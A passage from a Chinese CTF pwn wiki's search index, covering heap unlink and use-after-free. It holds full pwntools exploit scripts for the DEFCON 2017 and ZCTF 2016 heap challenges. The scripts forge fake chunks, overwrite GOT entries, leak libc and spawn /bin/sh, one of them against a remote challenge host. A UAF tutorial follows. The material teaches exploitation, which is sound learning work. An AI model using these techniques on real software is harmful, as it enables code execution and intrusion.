  idx   ==   6 : \n         p . recvuntil ( Increase Destructor s powerful:  ) \n         p . sendline ( str ( size ))  def   remove ( idx ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 2 ) \n     p . recvuntil ( Your choice : ) \n     p . sendline ( str ( idx ))  def   change ( idx ,   name ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 3 ) \n     p . recvuntil ( Your choice : ) \n     p . sendline ( str ( idx )) \n     p . recvuntil ( Robot s name:  \\n ) \n     p . send ( name )  def   start_robot (): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 4 )  def   overflow_benderinuse ( inuse ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 1 ) \n     p . recvuntil ( Your choice : ) \n     p . send ( 9999   +   inuse )  def   write ( where ,   what ): \n     change ( 1 ,   p64 ( where )) \n     change ( 6 ,   p64 ( what ))  def   exp (): \n     print   step 1 \n     # add a fastbin chunk 0x20 and free it \n     # so it is in fastbin, idx2- NULL \n     add ( 2 ,   1 )    # idx2 \n     remove ( 2 ) \n     # overflow bender inuse with 1 \n     overflow_benderinuse ( \\x01 ) \n     # change bender s fd to 0x603138, point to bender s size \n     # now fastbin 0x20, idx2- 0x603138- NULL \n     change ( 2 ,   p64 ( 0x603138 )) \n     # in order add bender again \n     overflow_benderinuse ( \\x00 ) \n     # add bender again, fastbin 0x603138- NULL \n     add ( 2 ,   1 ) \n     # in order to malloc chunk at 0x603138 \n     # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 \n     # it is at Robot Devil \n     add ( 3 ,   0x20 ) \n     # trigger malloc, set tinny point to 0x603148 \n     add ( 1 ) \n     # wheels must  = 3 \n     remove ( 2 ) \n     remove ( 3 ) \n\n     print   step 2 \n     # alloc Destructor size 60- 0x50, chunk content 0x40 \n     add ( 6 ,   3 ) \n     # alloc devil, size=20*7=140, bigger than fastbin \n     add ( 3 ,   7 ) \n     # edit destructor s size to 1000 by tinny \n     change ( 1 ,   p64 ( 1000 )) \n     # place fake chunk at destructor s pointer \n     fakechunk_addr   =   0x6030E8 \n     fakechunk   =   p64 ( 0 )   +   p64 ( 0x20 )   +   p64 ( fakechunk_addr   -   0x18 )   +   p64 ( \n         fakechunk_addr   -   0x10 )   +   p64 ( 0x20 ) \n     fakechunk   =   fakechunk . ljust ( 0x40 ,   a ) \n     fakechunk   +=   p64 ( 0x40 )   +   p64 ( 0xa0 ) \n     change ( 6 ,   fakechunk ) \n     # trigger unlink \n     remove ( 3 ) \n\n     print   step 3 \n     # make 0x6030F8 point to 0x6030E8 \n     payload   =   p64 ( 0 )   *   2   +   0x18   *   a   +   p64 ( 0x6030E8 ) \n     change ( 6 ,   payload ) \n\n     print   step 4 \n     # make exit just as return \n     write ( robots . got [ exit ],   0x401954 ) \n\n     print   step 5 \n     # set wheel cnt =3, 0x603130 in order to start robot \n     write ( 0x603130 ,   3 ) \n     # set destructor point to puts@got \n     change ( 1 ,   p64 ( robots . got [ puts ])) \n     start_robot () \n     p . recvuntil ( New hands great!! Thx  ) \n     puts_addr   =   p . recvuntil ( ! \\n ,   drop = True ) . ljust ( 8 ,   \\x00 ) \n     puts_addr   =   u64 ( puts_addr ) \n     log . success ( puts addr:    +   hex ( puts_addr )) \n     libc_base   =   puts_addr   -   libc . symbols [ puts ] \n     log . success ( libc base:    +   hex ( libc_base )) \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     binsh_addr   =   libc_base   +   next ( libc . search ( /bin/sh )) \n\n     # make free- system \n     write ( robots . got [ free ],   system_addr ) \n     # make destructor point to /bin/sh addr \n     write ( 0x6030E8 ,   binsh_addr ) \n     # get shell \n     remove ( 6 ) \n     p . interactive () \n\n     pass  if   __name__   ==   __main__ : \n     exp ()", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/unlink/#_12", 
            "text": "DEFCON 2017 Qualifiers beatmeonthedl", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/unlink/#_13", 
            "text": "malloc@angelboy  https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/pwn/heap/unlink/#note3", 
            "text": "", 
            "title": "note3"
        }, 
        {
            "location": "/pwn/heap/unlink/#_14", 
            "text": "ZCTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u70b9\u662fsafe unlink\u7684\u5229\u7528\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_15", 
            "text": "\u9898\u76ee\u662f\u4e00\u4e2anotepad\uff0c\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u67e5\u770b\u7b14\u8bb0\u7684\u529f\u80fd  1.New note\n2.Show note\n3.Edit note\n4.Delete note\n5.Quit\noption---   \u4fdd\u62a4\u5982\u4e0b\u6240\u793a  Canary                        : Yes\nNX                            : Yes\nPIE                           : No\nFortify                       : No\nRelRO                         : Partial", 
            "title": "\u9898\u76ee\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_16", 
            "text": "\u7a0b\u5e8fNew\u529f\u80fd\u7528\u6765\u65b0\u5efa\u7b14\u8bb0\uff0c\u7b14\u8bb0\u7684\u5927\u5c0f\u53ef\u4ee5\u81ea\u5b9a\u53ea\u8981\u5c0f\u4e8e1024\u5b57\u8282\u3002  int new()\n{\n  puts( Input the length of the note content:(less than 1024) );\n  size = get_num();\n  if ( size   0 )\n    return puts( Length error );\n  if ( size   1024 )\n    return puts( Content is too long );\n  heap_ptr = malloc(size);\n  puts( Input the note content: );\n  my_read(heap_ptr, size,  \\n );\n  bss_ptr[i] = heap_ptr;\n  current_ptr[i + 8LL] = size;\n  current_ptr[0] = bss_ptr[i];\n  return printf( note add success, the id is %d\\n , i);\n}  \u6240\u6709\u7684\u7b14\u8bb0malloc\u51fa\u6765\u7684\u6307\u9488\u5b58\u653e\u5728bss\u4e0a\u5168\u5c40\u6570\u7ec4bss_ptr\u4e2d\uff0c\u8fd9\u4e2a\u6570\u7ec4\u6700\u591a\u53ef\u4ee5\u5b58\u653e7\u4e2aheap_ptr\u3002\n\u800c\u4e14heap_ptr\u5bf9\u5e94\u7684size\u4e5f\u88ab\u653e\u5728bss_ptr\u6570\u7ec4\u4e2d\u3002current_ptr\u8868\u793a\u5f53\u524d\u7b14\u8bb0\uff0cbss\u5e03\u5c40\u5982\u4e0b\u3002  .bss:\ncurrent_ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size  Show\u529f\u80fd\u662f\u65e0\u7528\u7684\u529f\u80fd\uff0cedit\u548cdelete\u53ef\u4ee5\u7f16\u8f91\u548c\u91ca\u653enote\u3002", 
            "title": "\u529f\u80fd\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/unlink/#_17", 
            "text": "\u6f0f\u6d1e\u5b58\u5728\u4e8eedit\u529f\u80fd\u4e2d\uff0c\u8fd9\u91cc\u9762\u5728\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684id\u53f7\u4e4b\u540e\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c\u8f93\u5165\u7684id\u662f\u8d1f\u6570\u7684\u8bdd\u4f9d\u7136\u53ef\u4ee5\u6267\u884c\u3002\n\u5728get_num\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u8d1f\u6570\u3002  int edit()\n{\n\n  id = get_num();\n  data_ptr = ptr[id];\n  if ( data_ptr )\n  {\n    puts( Input the new content: );\n    my_read(ptr[id], current_ptr[id + 8],  \\n );\n    current_ptr[0] = ptr[id];\n    data_ptr = puts( Edit success );\n  }\n}  \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97edit\u8bfb\u5165cuurent_ptr\uff0c\u4f7f\u7528\u7684size\u662fnote7_ptr .bss:\ncurrent_ptr  == edit ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr    == size\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size \n\u9996\u5148\u521b\u5efa8\u4e2anote\uff0c\u7136\u540eedit note3\u4f7fcurrent_ptr\u6307\u5411note3\uff0c\u4e4b\u540e\u4f7f\u7528-1\u6ea2\u51fanote3 new(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\n\nedit(3, a )\nedit(-9223372036854775808,data);  \u6211\u4eec\u4f7f\u7528\u7684\u6ea2\u51fa\u6570\u636e\u662f\u7528\u4e8e\u6784\u9020\u4e00\u4e2afake chunk\u6765\u5b9e\u73b0safe unlink\u7684\u5229\u7528\uff0c\u5177\u4f53\u7684\u539f\u7406\u53ef\u4ee5\u770b\u8fd9\u4e00\u7ae0\u8282\u7684\u8bb2\u89e3\u3002  data =  \ndata += p64(0) + p64(512+1) #fake chunk header\ndata += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk \ndata +=  A *(512-32) \ndata += p64(512) + p64(512+16)   \u4e4b\u540e\u91ca\u653enote4\uff0cnote3\u4e0enote4\u5c31\u4f1a\u5408\u5e76\u3002note3_ptr\u4f1a\u6307\u5411note0_ptr\u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u4e0d\u65ad\u7684\u4fee\u6539note0_ptr\u7684\u503c\u548cedit note0\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6570\u636e\u3002  \u4f46\u662f\u9898\u76ee\u6ca1\u6709\u63d0\u4f9bshow\u529f\u80fd\uff0c\u6240\u4ee5\u65e0\u6cd5\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6cc4\u6f0f\u6570\u636e\u3002\n\u8fd9\u91cc\u91c7\u7528\u7684\u529e\u6cd5\u662f\u628afree\u7684got\u8868\u6539\u4e3aprintf\u7684\u503c\uff0c\u7136\u540e\u5728bbs\u4e2d\u4e00\u5757\u7a7a\u767d\u7684\u533a\u57df\u5199\u5165\"%x\"\u3002\n\u8fd9\u6837\u5f53free\u8fd9\u5757\u533a\u57df\uff08\u8fd9\u5757\u533a\u57df\u5728ptr_array\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\u7ed9free\uff09\uff0c\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u6808\u4e2d\u7684\u6570\u636e\u3002\n\u901a\u8fc7\u6808\u4e2d\u7684libc\u5730\u5740\u6c42\u51fasystem\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u5730\u5740\u5199\u83b7\u5f97shell  free(4)\n\nedit(3,free_got)\nedit(0,printf_plt)\n\nedit(3,p64(0x6020e8))\nedit(0, %llx. *30) \n\u5b8c\u6210\u7684exp\u5982\u4e0b  #!/usr/bin/python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport time\ndef malloc(size,data):\n    print conn.recvuntil( )\n    conn.sendline( 1 )\n    print conn.recvuntil( 1024) )\n    conn.sendline(str(size))\n    print conn.recvuntil( content: )\n    conn.sendline(data)\n    print conn.recvuntil( \\n )\ndef edit(id,data):\n    print conn.recvuntil( )\n    conn.sendline( 3 )\n    print conn.recvuntil( note: )\n    conn.sendline(str(id))\n    print conn.recvuntil( ent: )\n    conn.sendline(data)\n    print conn.recvuntil( success )\ndef free(id):\n    print conn.recvuntil( )\n    conn.sendline( 4 )\n    print conn.recvuntil( note: )\n    conn.sendline(str(id))\n    print conn.recvuntil( success )\n\n#conn = remote( 127.0.0.1 ,9999)\nconn = remote( 115.28.27.103 ,9003)\nfree_got = p64(0x602018)\nputs_got = p64(0x602020)\nstack_got = p64(0x602038)\nprintf_got = p64(0x602030)\nexit_got = p64(0x602078)\nprintf_plt = p64(0x400750)\nputs_plt = p64(0x400730)\n#libcstartmain_ret_off = 0x21b45\n#sys_off = 0x414f0\nlibcstartmain_ret_off = 0x21ec5\nsys_off = 0x46640\n# 1. int overflow lead to double free\nintoverflow = -9223372036854775808\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512,p64(0x400ef8))\nmalloc(512, /bin/sh\\0 )\n# 2. make a fake chunk and modify the next chunk s pre size \nfakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) +  A *(512-32) + p64(512) + p64(512+16)\nedit(3, aaaaaa )\nedit(intoverflow,fakechunk)\n# 3. double free\nfree(4)\n# 4. overwrite got\nedit(3,free_got)\nedit(0,printf_plt+printf_plt)\n# 5. leak the stack data\nedit(3,p64(0x6020e8))\nedit(0, %llx. *30)\n#free- puts\nprint conn.recvuntil( )\nconn.sendline( 4 )\nprint conn.recvuntil( note: )\nconn.sendline(str(0))\n#time.sleep(0.3)\nret =  conn.recvuntil( success )\nprint ret\n# 6. calcuate the system s addr\nlibcstart = ret.split( . )[10]\nlibcstart_2 = int(libcstart,16) - libcstartmain_ret_off\nprint  libc start addr: ,hex(libcstart_2)\nsystem_addr = libcstart_2 + sys_off\nprint  system_addr: ,hex(system_addr)\n# 7. overwrite free s got\nedit(3,free_got)\nedit(0,p64(system_addr)+printf_plt)\n# 8. write argv\nedit(3,p64(0x6020d0))\nedit(0, /bin/sh\\0 )\n# 9. exploit\nprint conn.recvuntil( )\nconn.sendline( 4 )\nprint conn.recvuntil( note: )\nconn.sendline(str(0))\nsleep(0.2)\nconn.interactive()", 
            "title": "\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/heap/use_after_free/", 
            "text": "Use After Free\n\n\n\u539f\u7406\n\n\n\u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\n\n\n\n\n\u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002\n\n\n\u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48\n\u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c\n\u3002\n\n\n\u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c\n\u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898\n\u3002\n\n\n\n\n\u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684 \nUse After Free\n \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c\n\u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\u7684\u5185\u5b58\u6307\u9488\u4e3adangling pointer\u3002\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\ntypedef\n \nstruct\n \nname\n \n{\n\n  \nchar\n \n*\nmyname\n;\n\n  \nvoid\n \n(\n*\nfunc\n)(\nchar\n \n*\nstr\n);\n\n\n}\n \nNAME\n;\n\n\nvoid\n \nmyprint\n(\nchar\n \n*\nstr\n)\n \n{\n \nprintf\n(\n%s\n\\n\n,\n \nstr\n);\n \n}\n\n\nvoid\n \nprintmyname\n()\n \n{\n \nprintf\n(\ncall print my name\n\\n\n);\n \n}\n\n\nint\n \nmain\n()\n \n{\n\n  \nNAME\n \n*\na\n;\n\n  \na\n \n=\n \n(\nNAME\n \n*\n)\nmalloc\n(\nsizeof\n(\nstruct\n \nname\n));\n\n  \na\n-\nfunc\n \n=\n \nmyprint\n;\n\n  \na\n-\nmyname\n \n=\n \nI can also use it\n;\n\n  \na\n-\nfunc\n(\nthis is my function\n);\n\n  \n// free without modify\n\n  \nfree\n(\na\n);\n\n  \na\n-\nfunc\n(\nI can also use it\n);\n\n  \n// free with modify\n\n  \na\n-\nfunc\n \n=\n \nprintmyname\n;\n\n  \na\n-\nfunc\n(\nthis is my function\n);\n\n  \n// set NULL\n\n  \na\n \n=\n \nNULL\n;\n\n  \nprintf\n(\nthis pogram will crash...\n\\n\n);\n\n  \na\n-\nfunc\n(\ncan not be printed...\n);\n\n\n}\n\n\n\n\n\n\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  use_after_free git:\n(\nuse_after_free\n)\n \u2717 ./use_after_free                      \nthis is my \nfunction\n\nI can also use it\ncall print my name\nthis pogram will crash...\n\n[\n1\n]\n    \n38738\n segmentation fault \n(\ncore dumped\n)\n  ./use_after_free\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote\u4e3a\u4f8b\u3002\n\n\n\u529f\u80fd\u5206\u6790\n\n\n\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2amenu\u51fd\u6570\uff0c\u5176\u4e2d\u6709\n\n\n  \nputs\n(\n 1. Add note          \n);\n\n  \nputs\n(\n 2. Delete note       \n);\n\n  \nputs\n(\n 3. Print note        \n);\n\n  \nputs\n(\n 4. Exit              \n);\n\n\n\n\n\n\u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u67093\u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002\n\n\nadd_note\n\n\n\u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a05\u4e2anote\u3002\u6bcf\u4e2anote\u6709\u4e24\u4e2a\u5b57\u6bb5put\u4e0econtent\uff0c\u5176\u4e2dput\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002\n\n\nunsigned\n \nint\n \nadd_note\n()\n\n\n{\n\n  \nnote\n \n*\nv0\n;\n \n// ebx\n\n  \nsigned\n \nint\n \ni\n;\n \n// [esp+Ch] [ebp-1Ch]\n\n  \nint\n \nsize\n;\n \n// [esp+10h] [ebp-18h]\n\n  \nchar\n \nbuf\n;\n \n// [esp+14h] [ebp-14h]\n\n  \nunsigned\n \nint\n \nv5\n;\n \n// [esp+1Ch] [ebp-Ch]\n\n\n  \nv5\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nif\n \n(\n \ncount\n \n=\n \n5\n \n)\n\n  \n{\n\n    \nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n=\n \n4\n;\n \n++\ni\n \n)\n\n    \n{\n\n      \nif\n \n(\n \n!\nnotelist\n[\ni\n]\n \n)\n\n      \n{\n\n        \nnotelist\n[\ni\n]\n \n=\n \nmalloc\n(\n8u\n);\n\n        \nif\n \n(\n \n!\nnotelist\n[\ni\n]\n \n)\n\n        \n{\n\n          \nputs\n(\nAlloca Error\n);\n\n          \nexit\n(\n-\n1\n);\n\n        \n}\n\n        \nnotelist\n[\ni\n]\n-\nput\n \n=\n \nprint_note_content\n;\n\n        \nprintf\n(\nNote size :\n);\n\n        \nread\n(\n0\n,\n \nbuf\n,\n \n8u\n);\n\n        \nsize\n \n=\n \natoi\n(\nbuf\n);\n\n        \nv0\n \n=\n \nnotelist\n[\ni\n];\n\n        \nv0\n-\ncontent\n \n=\n \nmalloc\n(\nsize\n);\n\n        \nif\n \n(\n \n!\nnotelist\n[\ni\n]\n-\ncontent\n \n)\n\n        \n{\n\n          \nputs\n(\nAlloca Error\n);\n\n          \nexit\n(\n-\n1\n);\n\n        \n}\n\n        \nprintf\n(\nContent :\n);\n\n        \nread\n(\n0\n,\n \nnotelist\n[\ni\n]\n-\ncontent\n,\n \nsize\n);\n\n        \nputs\n(\nSuccess !\n);\n\n        \n++\ncount\n;\n\n        \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv5\n;\n\n      \n}\n\n    \n}\n\n  \n}\n\n  \nelse\n\n  \n{\n\n    \nputs\n(\nFull\n);\n\n  \n}\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv5\n;\n\n\n}\n\n\n\n\n\nprint_note\n\n\nprint_note\u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684note\u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684note\u7684\u5185\u5bb9\u3002\n\n\nunsigned\n \nint\n \nprint_note\n()\n\n\n{\n\n  \nint\n \nv1\n;\n \n// [esp+4h] [ebp-14h]\n\n  \nchar\n \nbuf\n;\n \n// [esp+8h] [ebp-10h]\n\n  \nunsigned\n \nint\n \nv3\n;\n \n// [esp+Ch] [ebp-Ch]\n\n\n  \nv3\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nprintf\n(\nIndex :\n);\n\n  \nread\n(\n0\n,\n \nbuf\n,\n \n4u\n);\n\n  \nv1\n \n=\n \natoi\n(\nbuf\n);\n\n  \nif\n \n(\n \nv1\n \n \n0\n \n||\n \nv1\n \n=\n \ncount\n \n)\n\n  \n{\n\n    \nputs\n(\nOut of bound!\n);\n\n    \n_exit\n(\n0\n);\n\n  \n}\n\n  \nif\n \n(\n \nnotelist\n[\nv1\n]\n \n)\n\n    \nnotelist\n[\nv1\n]\n-\nput\n(\nnotelist\n[\nv1\n]);\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv3\n;\n\n\n}\n\n\n\n\n\ndelete_note\n\n\ndelete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728Use After Free\u7684\u60c5\u51b5\u7684\u3002\n\n\nunsigned\n \nint\n \ndel_note\n()\n\n\n{\n\n  \nint\n \nv1\n;\n \n// [esp+4h] [ebp-14h]\n\n  \nchar\n \nbuf\n;\n \n// [esp+8h] [ebp-10h]\n\n  \nunsigned\n \nint\n \nv3\n;\n \n// [esp+Ch] [ebp-Ch]\n\n\n  \nv3\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nprintf\n(\nIndex :\n);\n\n  \nread\n(\n0\n,\n \nbuf\n,\n \n4u\n);\n\n  \nv1\n \n=\n \natoi\n(\nbuf\n);\n\n  \nif\n \n(\n \nv1\n \n \n0\n \n||\n \nv1\n \n=\n \ncount\n \n)\n\n  \n{\n\n    \nputs\n(\nOut of bound!\n);\n\n    \n_exit\n(\n0\n);\n\n  \n}\n\n  \nif\n \n(\n \nnotelist\n[\nv1\n]\n \n)\n\n  \n{\n\n    \nfree\n(\nnotelist\n[\nv1\n]\n-\ncontent\n);\n\n    \nfree\n(\nnotelist\n[\nv1\n]);\n\n    \nputs\n(\nSuccess\n);\n\n  \n}\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv3\n;\n\n\n}\n\n\n\n\n\n\u5229\u7528\u5206\u6790\n\n\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2amagic\u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884cmagic\u51fd\u6570\u5462\uff1f\n\u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539note\u7684put\u5b57\u6bb5\u4e3amagic\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884cprint note \u7684\u65f6\u5019\u6267\u884cmagic\u51fd\u6570\u3002\n \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f                                                                         \n\n\n\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2anote\u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b\n\n\n\n\n\u7a0b\u5e8f\u7533\u8bf78\u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653enote\u4e2d\u7684put\u4ee5\u53cacontent\u6307\u9488\u3002\n\n\n\u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684size\u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8content\u3002\n   +-----------------+                       \n   |   put           |                       \n   +-----------------+                       \n   |   content       |       size              \n   +-----------------+-------------------\n+----------------+\n                                          |     real       |\n                                          |    content     |\n                                          |                |\n                                          +----------------+\n\n\n\n\n\n\n\n\n\n\u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136note\u662f\u4e00\u4e2afastbin chunk\uff08\u5927\u5c0f\u4e3a16\u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2anote\u7684put\u5b57\u6bb5\u4e3amagic\u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2anote\u7684put\u6307\u9488\u88ab\u8986\u76d6\u4e3amagic\u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9put\u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199real content\u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u7533\u8bf7note0\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09\n\n\n\u7533\u8bf7note1\uff0creal content 